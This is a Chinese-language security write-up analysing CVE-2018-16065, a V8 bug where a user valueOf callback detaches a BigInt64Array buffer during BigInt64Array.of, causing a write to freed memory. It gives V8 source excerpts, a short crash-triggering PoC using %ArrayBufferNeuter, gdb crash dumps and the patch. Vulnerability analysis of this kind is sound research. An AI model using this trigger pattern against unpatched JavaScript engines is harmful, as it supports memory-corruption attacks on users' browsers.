@@ -1,0 +1,443 @@
+# CVE-2018-16065 in V8 EmitBigTypedArrayElementStore 分析
+
+阅读量 **124323**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2021-03-23 10:30:35
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p5.ssl.qhimg.com/t01b51b7a9507020836.png)
+
+## 一、前言
+
+CVE-2018-16065 是 v8 中 `EmitBigTypedArrayElementStore` 函数内部的一个漏洞。该漏洞在检查相应
+ArrayBuffer 是否被 Detach（即是否是`neutered`）之后，执行了一个带有 **副作用** 的（即 **可调用用户 JS
+callback 代码** 的） `ToBigInt` 函数。而用户可在对应回调函数中将原先通过上述检查的 BigIntArray （即 **不是
+neutered 的 TypedArray** ）重新变成 `neutered`。
+
+这将使一部分数据被非法写入至一块已经 Detached 的 ArrayBuffer上。如果 GC 试图回收该 ArrayBuffer 的 backing
+store ，则会触发 CRASH。
+
+## 二、环境搭建
+
+切换 v8 版本，然后编译：
+
+    
+    
+    git checkout 6.8.275.24
+    gclient sync
+    tools/dev/gm.py x64.debug
+    
+
+## 三、漏洞细节
+
+在执行 JS 代码 `BigInt64Array.of` 函数时，v8 将调用以下 `Builtin_TypedArrayOf`函数：
+
+    
+    
+    // ES6 #sec-%typedarray%.of
+    TF_BUILTIN(TypedArrayOf, TypedArrayBuiltinsAssembler) {
+      TNode<Context> context = CAST(Parameter(BuiltinDescriptor::kContext));
+      [...]
+      DispatchTypedArrayByElementsKind(
+          elements_kind,
+          [&](ElementsKind kind, int size, int typed_array_fun_index) {
+            TNode<FixedTypedArrayBase> elements =
+                CAST(LoadElements(new_typed_array));
+            BuildFastLoop(
+                IntPtrConstant(0), length,
+                [&](Node* index) {
+                  TNode<Object> item = args.AtIndex(index, INTPTR_PARAMETERS);
+                  TNode<IntPtrT> intptr_index = UncheckedCast<IntPtrT>(index);
+                  // 如果当前的 TypeArray 是 BigIntArray
+                  if (kind == BIGINT64_ELEMENTS || kind == BIGUINT64_ELEMENTS) {
+                    // 则剩余操作在 EmitBigTypedArrayElementStore 函数内部完成
+                    EmitBigTypedArrayElementStore(new_typed_array, elements,
+                                                  intptr_index, item, context,
+                                                  &if_neutered);
+                  } else {
+                    [...]
+                  },
+                1, ParameterMode::INTPTR_PARAMETERS, IndexAdvanceMode::kPost);
+          });
+      [...]
+    }
+    
+
+对于 BigIntArray 这类 TypedArray，v8 将在该函数中继续调用 `EmitBigTypedArrayElementStore`
+函数，并在其中完成剩余的操作。
+
+`EmitBigTypedArrayElementStore` 函数较为简单，先看看源码：
+
+    
+    
+    void CodeStubAssembler::EmitBigTypedArrayElementStore(
+        TNode<JSTypedArray> object, TNode<FixedTypedArrayBase> elements,
+        TNode<IntPtrT> intptr_key, TNode<Object> value, TNode<Context> context,
+        Label* opt_if_neutered) {
+      if (opt_if_neutered != nullptr) {
+        // Check if buffer has been neutered.
+        Node* buffer = LoadObjectField(object, JSArrayBufferView::kBufferOffset);
+        GotoIf(IsDetachedBuffer(buffer), opt_if_neutered);
+      }
+      // 获取 BigInt，其中 ToBigInt 函数会调用 JS 中的 [Object.valueOf] 函数
+      TNode<BigInt> bigint_value = ToBigInt(context, value);
+      TNode<RawPtrT> backing_store = LoadFixedTypedArrayBackingStore(elements);
+      TNode<IntPtrT> offset = ElementOffsetFromIndex(intptr_key, BIGINT64_ELEMENTS,
+                                                     INTPTR_PARAMETERS, 0);
+      EmitBigTypedArrayElementStore(elements, backing_store, offset, bigint_value);
+    }
+    
+
+我们可以很容易的发现，如果 BigIntArray 的 ArrayBuffer 是 neutered 的，那么就直接跳到指定的 Label
+处进行异常处理，不会再继续向下执行，也就是说 **不会再将 elements 写入至 backing_store** 。
+
+但 `ToBigInt` 函数有点特殊，它将调用 Object.valueOf 属性的函数来获取值，而 **这个函数是可以被用户定义的**
+。如果我们在该函数中，将当前 BigIntArray 的 ArrayBuffer 设置为 neutered
+，那么下面执行写入操作时，数据写入的位置将是刚刚被 detach 的 ArrayBuffer 中。这是一步非法操作，如果 GC 试图回收该
+ArrayBuffer 的 backing store ，那么这将使 GC 触发崩溃。
+
+这里需要说明一下 `neutered` 的含义。即什么样的 ArrayBuffer 将会被视为 neutered 的？如何设置某个 Array 为
+neutered ？
+
+通过查阅 [v8
+docs](https://v8docs.nodesource.com/node-10.15/d5/d6e/classv8_1_1_array_buffer.html#ab73b5545800351ec54c4c0ac002f9d81)
+，我们可以简单了解到，Neuter 这个操作，会将 Buffer 和所有 typed Array 的长度设置为0，从而防止JavaScript访问底层
+backing_store。
+
+我们再来看一下 v8 中的一个 Runtime 函数：`ArrayBufferNeuter`:
+
+    
+    
+    RUNTIME_FUNCTION(Runtime_ArrayBufferNeuter) {
+      HandleScope scope(isolate);
+      DCHECK_EQ(1, args.length());
+      Handle<Object> argument = args.at(0);
+      // This runtime function is exposed in ClusterFuzz and as such has to
+      // support arbitrary arguments.
+      // 该函数只对 ArrayBuffer 类型的参数效果，若传入其他类型则引出异常
+      if (!argument->IsJSArrayBuffer()) {
+        THROW_NEW_ERROR_RETURN_FAILURE(
+            isolate, NewTypeError(MessageTemplate::kNotTypedArray));
+      }
+      Handle<JSArrayBuffer> array_buffer = Handle<JSArrayBuffer>::cast(argument);
+      // 如果当前 ArrayBuffer 不可被设置为 neuter,则不用继续执行下去，直接返回
+      if (!array_buffer->is_neuterable()) {
+        return isolate->heap()->undefined_value();
+      }
+      // 如果该 ArrayBuffer 的 backing_store 为空，检查 arraybuffer 的 length 是否为0。这一步是检查当前 ArrayBuffer 是否已经是 neutered 的。
+      if (array_buffer->backing_store() == nullptr) {
+        CHECK_EQ(Smi::kZero, array_buffer->byte_length());
+        return isolate->heap()->undefined_value();
+      }
+      // Shared array buffers should never be neutered.
+      CHECK(!array_buffer->is_shared());
+      DCHECK(!array_buffer->is_external());
+      // 准备开始 neuter 了，先获取 backing_store 指针和当前 ArrayBuffer 的长度
+      void* backing_store = array_buffer->backing_store();
+      size_t byte_length = NumberToSize(array_buffer->byte_length());
+      array_buffer->set_is_external(true);
+      // 将当前 ArrayBuffer 从ArrayBufferTracker中移除
+      isolate->heap()->UnregisterArrayBuffer(*array_buffer);
+      // 开始执行 neuter 操作
+      array_buffer->Neuter();
+      // 将backing_store占用的内存空间释放
+      isolate->array_buffer_allocator()->Free(backing_store, byte_length);
+      return isolate->heap()->undefined_value();
+    }
+    
+    
+    
+    void JSArrayBuffer::Neuter() {
+      CHECK(is_neuterable());
+      CHECK(!was_neutered());
+      CHECK(is_external());
+      // 将当前 backing store 移除
+      set_backing_store(nullptr);
+      // 设置当前 length 为 0
+      set_byte_length(Smi::kZero);
+      set_was_neutered(true);
+      set_is_neuterable(false);
+      // Invalidate the neutering protector.
+      Isolate* const isolate = GetIsolate();
+      if (isolate->IsArrayBufferNeuteringIntact()) {
+        isolate->InvalidateArrayBufferNeuteringProtector();
+      }
+    }
+    
+
+简单读一下源码，我们也可以很容易的发现， **ArrayBuffer 的 neuter 操作 就是删除 ArrayBuffer 中的 backing
+store 并重置其 length 字段。**
+
+综上所述，neuter 的具体操作已经非常明确了，如果不明确的话还可以使用 `%DebugPrint` 比较一下 neuter 前后的差异。
+
+接下来我们看看 Poc。
+
+## 四、PoC
+
+POC 如下：
+
+    
+    
+    // flags: --allow-natives-syntax --expose-gc
+    
+    var array = new BigInt64Array(11);
+    // constructor 返回数组
+    function constructor() { return array };
+    
+    function evil_callback() {
+      print("callback");
+      %ArrayBufferNeuter(array.buffer);
+      gc();
+      return 0xdeadbeefn;
+    }
+    
+    var evil_object = {valueOf: evil_callback}
+    
+    var root = BigInt64Array.of.call(
+      constructor,
+      evil_object
+    )
+    
+    gc(); // trigger
+    
+
+分析上面的 POC，可以理出一条这样的漏洞触发过程：
+
+  * 首先执行 BigInt64Array.of.call ，其中 多调用了一个 call 是为了使 constructor 函数和 设置的 element 都可以操作同一个 array。
+  * 初始时， array 的 backing_store 存在，因此将绕过 v8 `EmitBigTypedArrayElementStore` 函数中的 ArrayBuffer **neutered** 检查，进入 **ToBigInt** 函数。
+  * ToBigInt 函数将会获取传入 element 的值，因此便会调用 evil_object.valueOf 函数，即调用 evil_callback JS 函数。
+  * 该函数将执行 v8 Runtime 函数 `%ArrayBufferNeuter`，释放 array 中 ArrayBuffer 的 backing_store。
+  * 完成以上操作后，v8 `EmitBigTypedArrayElementStore` 函数中的 ToBigInt 函数将返回，此时继续执行，试图将 element 写入之前保存的 backing_store 里。
+  * 由于该 ArrayBuffer 已经被 detached，因此这样的写入将修改该 backing_store 上的一些用于 GC 的元数据，使最后在执行 GC 时触发崩溃。
+
+> **将值写入至 Detached ArrayBuffer** 时，因为其 heap chunk 仍然是 **allocated** 的，因此不存在
+> UaF。
+
+gdb 可能的两种崩溃输出如下：
+
+第一种
+
+    
+    
+    pwndbg> r
+    Starting program: /usr/class/v8/v8/out/x64.debug/d8 --allow-natives-syntax --expose-gc test.js
+    [Thread debugging using libthread_db enabled]
+    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+    [New Thread 0x7fe86accc700 (LWP 84765)]
+    [New Thread 0x7fe86a4cb700 (LWP 84766)]
+    [New Thread 0x7fe869cca700 (LWP 84767)]
+    [New Thread 0x7fe8694c9700 (LWP 84768)]
+    [New Thread 0x7fe868cc8700 (LWP 84769)]
+    [New Thread 0x7fe8684c7700 (LWP 84770)]
+    [New Thread 0x7fe867cc6700 (LWP 84771)]
+    callback
+    
+    Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
+    tcache_get (tc_idx=4) at malloc.c:2951
+    2951      --(tcache->counts[tc_idx]);
+    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+    ─────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────
+     RAX  0x5606a95b6030 ◂— 0x10000
+     RBX  0x4
+     RCX  0x5606a95b6018 ◂— 0x10001
+     RDX  0x0
+     RDI  0x58
+     RSI  0x7ffe89539b58 —▸ 0x5606a95d2ef0 —▸ 0x7ffe8953ba10 ◂— 0x5606a95d2ef0
+     R8   0xdeadbeef
+     R9   0x7ffe89539b6c ◂— 0x89539df800000002
+     R10  0x58
+     R11  0x58
+     R12  0xffffffffffffffa8
+     R13  0x5606a95d2fb8 —▸ 0x283c80e82ba9 ◂— 0x283c80e822
+     R14  0x5
+     R15  0x7ffe8953ab08 —▸ 0x354172782e39 ◂— 0xb1000005ceeae0ae
+     RBP  0x58
+     RSP  0x7ffe89539990 —▸ 0x7fe86cf8d220 ◂— push   rbp
+     RIP  0x7fe86b7227be (malloc+286) ◂— mov    rsi, qword ptr [r8]
+    ───────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────
+     ► 0x7fe86b7227be <malloc+286>    mov    rsi, qword ptr [r8]
+       0x7fe86b7227c1 <malloc+289>    mov    qword ptr [rax + 0x80], rsi
+       0x7fe86b7227c8 <malloc+296>    mov    word ptr [rcx], dx
+       0x7fe86b7227cb <malloc+299>    mov    qword ptr [r8 + 8], 0
+       0x7fe86b7227d3 <malloc+307>    jmp    malloc+184 <malloc+184>
+        ↓
+       0x7fe86b722758 <malloc+184>    pop    rbx
+       0x7fe86b722759 <malloc+185>    mov    rax, r8
+       0x7fe86b72275c <malloc+188>    pop    rbp
+       0x7fe86b72275d <malloc+189>    pop    r12
+       0x7fe86b72275f <malloc+191>    ret    
+    
+       0x7fe86b722760 <malloc+192>    and    rax, 0xfffffffffffffff0
+    ───────────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────────
+    In file: /build/glibc-TrjWJf/glibc-2.29/malloc/malloc.c
+       2946 {
+       2947   tcache_entry *e = tcache->entries[tc_idx];
+       2948   assert (tc_idx < TCACHE_MAX_BINS);
+       2949   assert (tcache->entries[tc_idx] > 0);
+       2950   tcache->entries[tc_idx] = e->next;
+     ► 2951   --(tcache->counts[tc_idx]);
+       2952   e->key = NULL;
+       2953   return (void *) e;
+       2954 }
+       2955 
+       2956 static void
+    ───────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────
+    00:0000│ rsp  0x7ffe89539990 —▸ 0x7fe86cf8d220 ◂— push   rbp
+    01:0008│      0x7ffe89539998 —▸ 0x7ffe895399e0 —▸ 0x7ffe89539aa0 —▸ 0x7ffe89539de0 —▸ 0x7ffe89539e00 ◂— ...
+    02:0010│      0x7ffe895399a0 ◂— 0xffffffffffffffff
+    03:0018│      0x7ffe895399a8 —▸ 0x7fe86bb459d8 ◂— mov    qword ptr [rbp - 0x10], rax
+    04:0020│      0x7ffe895399b0 ◂— 0x2a100
+    05:0028│      0x7ffe895399b8 —▸ 0x5606a962c3d0 ◂— 0x0
+    06:0030│      0x7ffe895399c0 —▸ 0x5606a962c370 ◂— 0x0
+    07:0038│      0x7ffe895399c8 —▸ 0x5606a962d3f0 —▸ 0x7fe86e241580 —▸ 0x7fe86d76e780 (v8::internal::CodeSpace::~CodeSpace()) ◂— push   rbp
+    ─────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────
+     ► f 0     7fe86b7227be malloc+286
+       f 1     7fe86b7227be malloc+286
+       f 2     7fe86bb459d8
+       f 3     7fe86d823957
+       f 4     7fe86d8209a1
+       f 5     7fe86d8168de
+       f 6     7fe86d816309 v8::internal::Sweeper::StartSweeperTasks()+857
+       f 7     7fe86d7932b7 v8::internal::MarkCompactCollector::Finish()+343
+    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+    
+
+第二种
+
+    
+    
+    pwndbg> r
+    Starting program: /usr/class/v8/v8/out/x64.debug/d8 --allow-natives-syntax --expose-gc test.js
+    [Thread debugging using libthread_db enabled]
+    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+    [New Thread 0x7f1802341700 (LWP 87692)]
+    [New Thread 0x7f1801b40700 (LWP 87693)]
+    [New Thread 0x7f180133f700 (LWP 87694)]
+    [New Thread 0x7f1800b3e700 (LWP 87695)]
+    [New Thread 0x7f180033d700 (LWP 87696)]
+    [New Thread 0x7f17ffb3c700 (LWP 87697)]
+    [New Thread 0x7f17ff33b700 (LWP 87698)]
+    callback
+    
+    Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
+    0x00007f180468f76b in std::__1::__hash_table<std::__1::__hash_value_type<unsigned long, v8::internal::Cancelable*>, std::__1::__unordered_map_hasher<unsigned long, std::__1::__hash_value_type<unsigned long, v8::internal::Cancelable*>, std::__1::hash<unsigned long>, true>, std::__1::__unordered_map_equal<unsigned long, std::__1::__hash_value_type<unsigned long, v8::internal::Cancelable*>, std::__1::equal_to<unsigned long>, true>, std::__1::allocator<std::__1::__hash_value_type<unsigned long, v8::internal::Cancelable*> > >::__emplace_unique_key_args<unsigned long, std::__1::piecewise_construct_t const&, std::__1::tuple<unsigned long const&>, std::__1::tuple<> >(unsigned long const&, std::__1::piecewise_construct_t const&, std::__1::tuple<unsigned long const&>&&, std::__1::tuple<>&&) (this=0x559480f98fc8, __k=[@0x7ffd622fe4c8](https://github.com/0x7ffd622fe4c8 "@0x7ffd622fe4c8"): 22, __args=..., __args=..., __args=...) at ../../buildtools/third_party/libc++/trunk/include/__hash_table:2010       
+    2010                for (__nd = __nd->__next_; __nd != nullptr &&
+    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+    ─────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────
+     RAX  0xdeadbeef
+     RBX  0x7f1804602220 ◂— push   rbp
+     RCX  0x559480f98fc8 —▸ 0x559480ff5c50 ◂— 0xdeadbeef
+     RDX  0x0
+     RDI  0x7ffd622fe4c8 ◂— 0x16
+     RSI  0x16
+     R8   0x559480f99020 ◂— 0x1
+     R9   0x10
+     R10  0x0
+     R11  0x7f1802ecaca0 (main_arena+96) —▸ 0x559481034310 ◂— 0x0
+     R12  0xffffffffffffffff
+     R13  0x559480f8efb8 —▸ 0xba4cbf82ba9 ◂— 0xba4cbf822
+     R14  0x5
+     R15  0x7ffd622ffc08 —▸ 0x1d3adb982e39 ◂— 0xb10000254d0fb8ae
+     RBP  0x7ffd622fe480 —▸ 0x7ffd622fe560 —▸ 0x7ffd622fe590 —▸ 0x7ffd622fe5c0 —▸ 0x7ffd622fe5f0 ◂— ...
+     RSP  0x7ffd622fdd60 —▸ 0x7ffd622fdf90 ◂— 0x0
+     RIP  0x7f180468f76b ◂— mov    rax, qword ptr [rax]
+    ───────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────
+     ► 0x7f180468f76b    mov    rax, qword ptr [rax]
+       0x7f180468f76e    mov    qword ptr [rbp - 0x598], rax
+       0x7f180468f775    xor    eax, eax
+       0x7f180468f777    mov    cl, al
+       0x7f180468f779    cmp    qword ptr [rbp - 0x598], 0
+       0x7f180468f781    mov    byte ptr [rbp - 0x689], cl
+       0x7f180468f787    je     0x7f180468f88e <0x7f180468f88e>
+        ↓
+       0x7f180468f88e    mov    al, byte ptr [rbp - 0x689]
+       0x7f180468f894    test   al, 1
+       0x7f180468f896    jne    0x7f180468f8a1 <0x7f180468f8a1>
+        ↓
+       0x7f180468f8a1    mov    rax, qword ptr [rbp - 0x678]
+    ───────────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────────
+    In file: /usr/class/v8/v8/buildtools/third_party/libc++/trunk/include/__hash_table
+       2005     {
+       2006         __chash = __constrain_hash(__hash, __bc);
+       2007         __nd = __bucket_list_[__chash];
+       2008         if (__nd != nullptr)
+       2009         {
+     ► 2010             for (__nd = __nd->__next_; __nd != nullptr &&
+       2011                 (__nd->__hash() == __hash || __constrain_hash(__nd->__hash(), __bc) == __chash);
+       2012                                                            __nd = __nd->__next_)
+       2013             {
+       2014                 if (key_eq()(__nd->__upcast()->__value_, __k))
+       2015                     goto __done;
+    ───────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────
+    00:0000│ rsp  0x7ffd622fdd60 —▸ 0x7ffd622fdf90 ◂— 0x0
+    01:0008│      0x7ffd622fdd68 —▸ 0x559481012378 —▸ 0x559481012310 —▸ 0x7f18058b3d60 —▸ 0x7f180483bc10 (v8::internal::Sweeper::IncrementalSweeperTask::~IncrementalSweeperTask()) ◂— ...                                                                                          
+    02:0010│      0x7ffd622fdd70 ◂— 0x0
+    03:0018│      0x7ffd622fdd78 —▸ 0x7ffd622fe450 —▸ 0x559480f99020 ◂— 0x1
+    04:0020│      0x7ffd622fdd80 ◂— 9 /* '\t' */
+    ... ↓
+    06:0030│      0x7ffd622fdd90 —▸ 0x559481012360 —▸ 0x5594810122e0 —▸ 0x559480fd85d0 —▸ 0x559480ff43e0 ◂— ...
+    07:0038│      0x7ffd622fdd98 —▸ 0x559480fe96d0 —▸ 0x559480fe9700 ◂— 0x0
+    ─────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────
+     ► f 0     7f180468f76b
+       f 1     7f180468f76b
+       f 2     7f180468e086 v8::internal::CancelableTaskManager::Register(v8::internal::Cancelable*)+502
+       f 3     7f180468de7a v8::internal::Cancelable::Cancelable(v8::internal::CancelableTaskManager*)+106
+       f 4     7f180468f237 v8::internal::CancelableTask::CancelableTask(v8::internal::CancelableTaskManager*)+39
+       f 5     7f180468f200 v8::internal::CancelableTask::CancelableTask(v8::internal::Isolate*)+48
+       f 6     7f1804d79983
+       f 7     7f1804d71c98
+    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+    
+
+## 五、后记
+
+该漏洞的[补丁](https://chromium.googlesource.com/v8/v8.git/+/7d47839dc062b69467f58c55aab7cc9abf78d687)非常简单：将调用
+ToBigInt 函数的那一行语句，提至条件判断语句之前。这样就可以使 user JS callback 导致的 Neutered 也被 if
+条件判断给捕获。
+
+## 六、参考
+
+  * [Issue 867776: V8 OOB write BigInt64Array.of and BigInt64Array.from side effect neuter](https://bugs.chromium.org/p/chromium/issues/detail?id=867776)
+
+![](https://p1.ssl.qhimg.com/t01d2ef4c50d560d7ac.png)
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **Kiprey** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/233515](/post/id/233515)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [v8](/tag/v8)
+  * [callback](/tag/callback)
+
+ **+1** __2赞
+
+ __收藏
+
+![](https://thirdqq.qlogo.cn/g?b=oidb&k=Ggib7X9SSVicoZnE34KxGlzg&s=40&t=1506914961)
+Kiprey
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
